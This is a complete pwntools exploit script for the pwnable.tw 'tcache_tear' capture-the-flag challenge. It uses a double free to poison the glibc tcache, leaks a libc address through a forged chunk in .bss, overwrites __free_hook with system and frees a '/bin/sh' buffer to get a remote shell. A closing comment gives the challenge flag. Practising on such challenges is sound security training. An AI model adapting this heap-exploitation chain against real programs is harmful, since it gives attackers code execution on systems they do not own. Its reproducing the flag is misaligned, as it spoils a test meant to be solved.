from pwn import *

elf = ELF("tcache_tear")
libc = ELF("libc-2.27.so")
bss = 0x602060
onegadget = 0x4f322
banner = "Your choice :"

r = remote("chall.pwnable.tw", 10207)


def init(name):
    r.recvuntil("Name:")
    r.sendline(name)


def free():
    r.recvuntil(banner)
    r.sendline("2")


def malloc(size, data):
    r.recvuntil(banner)
    r.sendline("1")
    r.recvuntil("Size:")
    r.sendline(str(size))
    r.recvuntil("Data:")
    r.sendline(data)


def info():
    r.recvuntil(banner)
    r.sendline("3")


def write(size, address, data):
    malloc(size, 'AAAA')
    free()
    free()
    malloc(size, p64(address))
    malloc(size, 'AAA')
    malloc(size, data)


with log.progress("leaking libc") as l:
    init(p64(0) + p64(0x501))
    write(0x50, bss + 0x500, (p64(0) + p64(0x21) + p64(0) * 2) * 2)
    write(0x60, bss + 0x10, 'A')
    free()
    info()
    r.recvuntil("Name :")
    r.recv(0x10)
    leak = u64(r.recv(8))
    libc_base = leak - 0x3ebca0
    free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    l.success(hex(libc_base))

    with log.progress("overwriting __free_hook") as l:
        write(0x70, free_hook, p64(system))
        malloc(0x80, "/bin/sh\x00")
        l.status("triggering free()")
        free()
        l.success()
        r.interactive()

# FLAG --> FLAG{tc4ch3_1s_34sy_f0r_y0u}
